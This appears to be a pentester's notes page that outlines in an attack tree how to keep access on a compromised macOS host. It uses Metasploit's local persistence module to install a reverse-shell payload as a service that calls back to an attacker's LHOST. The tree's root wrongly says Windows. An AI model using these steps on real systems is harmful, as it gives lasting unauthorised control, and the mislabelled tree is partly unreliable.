# Maintaining access on macOS with Meterpreter

## Attack tree

```text
1 Maintain access on Windows
    1.1 In meterpreter background the current basic shell (AND)
    1.2  > use exploit/osx/local/persistence (AND)
    1.3 Set RUN_NOW to true (AND)
    1.4 Set SESSION to the id of the basic shell just put in the background (AND)
    1.5 > show payloads (AND)
    1.6 Inject payload (such as osx/x86/shell_reverse_tcp) as a service with > set PAYLOAD [payload] (AND)
    1.7 Set LHOST and LPORT
    1.8 > exploit
    1.9 Copy the three commands given for cleanup later
```

## Notes

## Cheatsheets

* [Linux post exploitation enumeration](cheatsheets:docs/enumeration/linux-post)
* [Offensive security: Meterpreter Basic Commands](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
* [Metasploit documentation](https://docs.metasploit.com/)